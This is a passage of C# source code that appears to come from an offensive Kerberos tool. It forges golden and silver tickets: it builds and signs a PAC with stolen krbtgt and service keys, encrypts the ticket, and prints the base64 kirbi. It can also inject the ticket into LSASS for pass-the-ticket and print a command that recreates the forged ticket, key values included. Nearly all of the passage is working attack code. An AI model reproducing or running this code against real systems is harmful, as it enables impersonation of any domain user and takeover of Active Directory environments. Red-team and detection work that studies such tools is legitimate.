UpnDns upnDns = new UpnDns(0, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));\n\n                S4UDelegationInfo s4u = null;\n                if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))\n                {\n                    s4u = new S4UDelegationInfo(s4uProxyTarget, s4uTransitedServices.Split(\',\'));\n                }\n\n                Console.WriteLine("[*] Generating EncTicketPart");\n\n                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, cRealm.ToUpper(), cName, flags, cn.ClientId);\n\n                // set other times in EncTicketPart\n                DateTime? check = null;\n                decTicketPart.authtime = (DateTime)authTime;\n                if (!String.IsNullOrEmpty(endTime))\n                {\n                    check = Helpers.FutureDate((DateTime)startTime, endTime);\n                    if (check != null)\n                    {\n                        decTicketPart.endtime = (DateTime)check;\n                    }\n                }\n                if (!String.IsNullOrEmpty(renewTill))\n                {\n                    check = Helpers.FutureDate((DateTime)startTime, renewTill);\n                    if (check != null)\n                    {\n                        decTicketPart.renew_till = (DateTime)check;\n                    }\n                }\n\n                if (decTicketPart.authorization_data == null)\n                {\n                    decTicketPart.authorization_data = new List<AuthorizationData>();\n                }\n\n                // generate blank PAC for TicketChecksum for service tickets\n                SignatureData ticketSigData = null;\n                if (!(parts[0].Equals("krbtgt") && parts[1].Equals(domain)))\n                {\n                    ticketSigData = new SignatureData(PacInfoBufferType.TicketChecksum);\n                    ticketSigData.SignatureType = kdcSigData.SignatureType;\n                    ADIfRelevant ifrelevant = new ADIfRelevant();\n                    ADWin2KPac win2KPac = new ADWin2KPac();\n                    win2KPac.Pac = null;\n                    win2KPac.ad_data = new byte[] { 0x00 };\n                    decTicketPart.authorization_data.Add(new ADIfRelevant(win2KPac));\n                }\n\n                // set extra AuthorizationData sections\n                if (includeAuthData)\n                {\n                    ADIfRelevant ifrelevant = new ADIfRelevant();\n                    ADRestrictionEntry restrictions = new ADRestrictionEntry();\n                    ADKerbLocal kerbLocal = new ADKerbLocal();\n                    ifrelevant.ADData.Add(restrictions);\n                    ifrelevant.ADData.Add(kerbLocal);\n                    decTicketPart.authorization_data.Add(ifrelevant);\n                }\n\n                // now we have the extra auth data sections, calculate TicketChecksum\n                if (!(parts[0].Equals("krbtgt") && parts[1].Equals(domain)))\n                {\n                    ticketSigData.Signature = decTicketPart.CalculateTicketChecksum(krbKey, kdcSigData.SignatureType);\n                }\n\n                Attributes attrib = null;\n                Requestor requestor = null;\n                if (newPac)\n                {\n                    attrib = new Attributes();\n                    requestor = new Requestor(String.Format("{0}-{1}", li.KerbValidationInfo.LogonDomainId?.GetValue(), li.KerbValidationInfo.UserId));\n                }\n\n                // clear signatures\n                Console.WriteLine("[*] Signing PAC");\n                svrSigData.Signature = new byte[svrSigLength];\n                kdcSigData.Signature = new byte[kdcSigLength];\n                Array.Clear(svrSigData.Signature, 0, svrSigLength);\n                Array.Clear(kdcSigData.Signature, 0, kdcSigLength);\n\n                // add sections to the PAC, get bytes and generate checksums\n                List<PacInfoBuffer> PacInfoBuffers = new List<PacInfoBuffer>();\n                if (s4u != null)\n                {\n                    PacInfoBuffers.Add(s4u);\n                }\n                PacInfoBuffers.Add(li);\n                PacInfoBuffers.Add(cn);\n                PacInfoBuffers.Add(upnDns);\n                if (newPac)\n                {\n                    PacInfoBuffers.Add(attrib);\n                    PacInfoBuffers.Add(requestor);\n                }\n                PacInfoBuffers.Add(svrSigData);\n                PacInfoBuffers.Add(kdcSigData);\n                if (ticketSigData != null)\n                {\n                    PacInfoBuffers.Add(ticketSigData);\n                }\n                PACTYPE pt = new PACTYPE(0, PacInfoBuffers);\n                byte[] ptBytes = pt.Encode();\n                byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);\n                byte[] kdcSig = Crypto.KerberosChecksum(krbKey, svrSig, kdcSigData.SignatureType);\n\n                // add checksums\n                svrSigData.Signature = svrSig;\n                kdcSigData.Signature = kdcSig;\n                PacInfoBuffers = new List<PacInfoBuffer>();\n                if (s4u != null)\n                {\n                    PacInfoBuffers.Add(s4u);\n                }\n                PacInfoBuffers.Add(li);\n                PacInfoBuffers.Add(cn);\n                PacInfoBuffers.Add(upnDns);\n                if (newPac)\n                {\n                    PacInfoBuffers.Add(attrib);\n                    PacInfoBuffers.Add(requestor);\n                }\n                PacInfoBuffers.Add(svrSigData);\n                PacInfoBuffers.Add(kdcSigData);\n                if (ticketSigData != null)\n                {\n                    PacInfoBuffers.Add(ticketSigData);\n                }\n                pt = new PACTYPE(0, PacInfoBuffers);\n\n                // add the PAC to the ticket\n                decTicketPart.SetPac(pt);\n\n\n                // encrypt the EncTicketPart\n                Console.WriteLine("[*] Encrypting EncTicketPart");\n                byte[] encTicketData = decTicketPart.Encode().Encode();\n                byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);\n\n                // initialize the ticket and add the enc_part\n                Console.WriteLine("[*] Generating Ticket");\n                Ticket ticket = new Ticket(domain.ToUpper(), sname);\n                ticket.enc_part = new EncryptedData((Int32)etype, encTicketPart, 3);\n\n                // add the ticket\n                cred.tickets.Add(ticket);\n\n                // [0] add in the session key\n                info.key.keytype = (int)etype;\n                info.key.keyvalue = randKeyBytes;\n\n                // [1] prealm (domain)\n                info.prealm = ticket.realm;\n\n                // [2] pname (user)\n                info.pname.name_type = decTicketPart.cname.name_type;\n                info.pname.name_string = decTicketPart.cname.name_string;\n\n                // [3] flags\n                info.flags = flags;\n\n                // [4] authtime (not required)\n                info.authtime = decTicketPart.authtime;\n\n                // [5] starttime\n                info.starttime = decTicketPart.starttime;\n\n                // [6] endtime\n                info.endtime = decTicketPart.endtime;\n\n                // [7] renew-till\n                info.renew_till = decTicketPart.renew_till;\n\n                // [8] srealm\n                info.srealm = ticket.realm;\n\n                // [9] sname\n                info.sname.name_type = ticket.sname.name_type;\n                info.sname.name_string = ticket.sname.name_string;\n\n                // add the ticket_info into the cred object\n                cred.enc_part.ticket_info.Add(info);\n\n                Console.WriteLine("[*] Generated KERB-CRED");\n\n\n\n                byte[] kirbiBytes = cred.Encode().Encode();\n\n                string kirbiString = Convert.ToBase64String(kirbiBytes);\n\n                if (parts[0] == "krbtgt")\n                {\n                    Console.WriteLine("[*] Forged a TGT for \'{0}@{1}\'", info.pname.name_string[0], domain);\n                }\n                else\n                {\n                    Console.WriteLine("[*] Forged a TGS for \'{0}\' to \'{1}\'", info.pname.name_string[0], sname);\n                }\n                Console.WriteLine("");\n\n                // dates unique to this ticket\n                Console.WriteLine("[*] AuthTime       : {0}", decTicketPart.authtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));\n                Console.WriteLine("[*] StartTime      : {0}", decTicketPart.starttime.ToLocalTime().ToString(CultureInfo.CurrentCulture));\n                Console.WriteLine("[*] EndTime        : {0}", decTicketPart.endtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));\n                Console.WriteLine("[*] RenewTill      : {0}", decTicketPart.renew_till.ToLocalTime().ToString(CultureInfo.CurrentCulture));\n\n                Console.WriteLine("");\n\n                Console.WriteLine("[*] base64(ticket.kirbi):\\r\\n");\n\n                if (false)\n                {\n                    // display the .kirbi base64, columns of 80 chararacters\n                    foreach (string line in Helpers.Split(kirbiString, 80))\n                    {\n                        Console.WriteLine("      {0}", line);\n                    }\n                }\n                else\n                {\n                    Console.WriteLine("      {0}", kirbiString);\n                }\n\n                Console.WriteLine("");\n\n                if (!String.IsNullOrEmpty(outfile))\n                {\n                    DateTime fileTime = (DateTime)startTime;\n                    string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";\n                    filename = Helpers.MakeValidFileName(filename);\n                    if (Helpers.WriteBytesToFile(filename, kirbiBytes))\n                    {\n                        Console.WriteLine("\\r\\n[*] Ticket written to {0}\\r\\n", filename);\n                    }\n                }\n\n                Console.WriteLine("");\n\n                if (ptt)\n                {\n                    // pass-the-ticket -> import into LSASS\n                    LSA.ImportTicket(kirbiBytes, new LUID());\n                }\n\n                // increase startTime by rangeInterval\n                startTime = Helpers.FutureDate((DateTime)startTime, rangeInterval);\n                if (startTime == null)\n                {\n                    Console.WriteLine("[!] Invalid /rangeinterval passed, skipping multiple ticket generation: {0}", rangeInterval);\n                    startTime = rangeEnd;\n                }\n                authTime = startTime;\n\n            } while (startTime < rangeEnd);\n\n            if (printcmd)\n            {\n                // print command to be able to recreate a ticket with this information\n                string cmdOut = String.Format("{0}", System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);\n\n                // deal with differences between golden and silver\n                if (parts[0].Equals("krbtgt") && parts[1].Equals(domain))\n                {\n                    cmdOut = String.Format("{0} golden", cmdOut, Helpers.ByteArrayToString(serviceKey));\n                }\n                else\n                {\n                    string krbEncType = "";\n                    if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5))\n                    {\n                        krbEncType = "rc4";\n                    }\n                    else if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))\n                    {\n                        krbEncType = "aes128";\n                    }\n                    else if (kdcSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256))\n                    {\n                        krbEncType = "aes256";\n                    }\n                    cmdOut = String.Format("{0} silver /service:{1} /krbkey:{2} /kebenctype:{3}", cmdOut, sname, Helpers.ByteArrayToString(krbKey), krbEncType);\n                }\n\n                // add the service key\n                string svrEncType = "";\n                if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5))\n                {\n                    svrEncType = "rc4";\n                }\n                else if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128))\n                {\n                    svrEncType = "aes128";\n                }\n                else if (svrSigData.SignatureType.Equals(Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256))\n                {\n                    svrEncType = "aes256";\n                }\n                cmdOut = String.Format("{0} /{1}:{2}", cmdOut, svrEncType, Helpers.ByteArrayToString(serviceKey));\n\n                // add the rest of the values\n                cmdOut = String.Format("{0} /user:{1} /id:{2} /pgid:{3} /domain:{4} /sid:{5}", cmdOut, user, kvi.UserId, kvi.PrimaryGroupId, domain, kvi.LogonDomainId.GetValue());\n                try\n                {\n                    cmdOut = String.Format("{0} /logofftime:\\"{1}\\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.LogoffTime.LowDateTime | ((long)kvi.LogoffTime.HighDateTime << 32)).ToLocalTime());\n                }\n                catch { }\n                try\n                {\n                    cmdOut = String.Format("{0} /pwdlastset:\\"{1}\\"", cmdOut, DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32)).ToLocalTime());\n                }\n                catch { }\n                if (minPassAge != null && minPassAge > 0)\n                {\n                    cmdOut = String.Format("{0} /minpassage:{1}", cmdOut, minPassAge);\n                }\n                if (maxPassAge != null && maxPassAge > 0)\n                {\n                    cmdOut = String.Format("{0} /maxpassage:{1}", cmdOut, maxPassAge);\n                }\n                if (kvi.BadPasswordCount > 0)\n                {\n                    cmdOut = String.Format("{0} /badpwdcount:{1}", cmdOut, kvi.BadPasswordCount);\n                }\n                if (kvi.LogonCount > 0)\n                {\n                    cmdOut = String.Format("{0} /logoncount:{1}", cmdOut, kvi.LogonCount);\n                }\n                if (!String.IsNullOrEmpty(kvi.FullName.ToString()))\n                {\n                    cmdOut = String.Format("{0} /displayname:\\"{1}\\"", cmdOut, kvi.FullName.ToString());\n                }\n                if (!String.IsNullOrEmpty(kvi.LogonScript.ToString()))\n                {\n                    cmdOut = String.Format("{0} /scriptpath:\\"{1}\\"", cmdOut, kvi.LogonScript.ToString());\n                }\n                if (!String.IsNullOrEmpty(kvi.ProfilePath.ToString()))\n                {\n                    cmdOut = String.Format("{0} /profilepath:\\"{1}\\"", cmdOut, kvi.ProfilePath.ToString());\n                }\n                if (!String.IsNullOrEmpty(kvi.HomeDirectory.ToString()))\n                {\n                    cmdOut = String.Format("{0} /homedir:\\"{1}\\"", cmdOut, kvi.HomeDirectory.ToString());\n                }\n                if (!String.IsNullOrEmpty(kvi.HomeDirectoryDrive.ToString()))\n                {\n                    cmdOut = String.Format("{0} /homedrive:\\"{1}\\"", cmdOut, kvi.HomeDirectoryDrive.ToString());\n                }\n                if (!String.IsNullOrEmpty(kvi.LogonDomainName.ToString()))\n                {\n                    cmdOut = String.Format("{0} /netbios:{1}", cmdOut, kvi.LogonDomainName.ToString());\n                }\n                if (kvi.GroupCount > 0)\n                {\n                    cmdOut = String.Format("{0} /groups:{1}", cmdOut, kvi.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));\n                }\n                if (kvi.SidCount > 0)\n                {\n                    cmdOut = String.Format("{0} /sids:{1}", cmdOut, kvi.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));\n                }\n                if (kvi.ResourceGroupCount > 0)\n                {\n                        cmdOut = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", cmdOut, kvi.ResourceGroupDomainSid.GetValue().ToString(), kvi.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));\n                }\n                if (!String.IsNullOrEmpty(kvi.LogonServer.ToString()))\n                {\n                    cmdOut = String.Format("{0} /dc:{1}.{2}", cmdOut, kvi.LogonServer.ToString(), domain);\n                }\n                if ((Interop.PacUserAccountControl)kvi.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)\n                {\n                    cmdOut = String.Format("{0} /uac:{1}", cmdOut, String.Format("{0}", (Interop.PacUserAccountControl)kvi.UserAccountControl).Replace(" ", ""));\n                }\n                if (!user.Equals(cName))\n                {\n                    cmdOut = String.Format("{0} /cname:{1}", cmdOut, cName);\n                }\n                if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))\n                {\n                    cmdOut = String.Format("{0} /s4uproxytarget:{1} /s4utransitiedservices:{2}", cmdOut, s4uProxyTarget, s4uTransitedServices);\n                }\n                if (includeAuthData)\n                {\n                    cmdOut = String.Format("{0} /authdata", cmdOut);\n                }\n\n                // print the command\n                Console.WriteLine("\\r\\n[*] Printing a command to recreate a ticket containing the information used within this ticket\\r\\n\\r\\n{0}\\r\\n", cmdOut);\n            }\n        }\n    }\n}\n'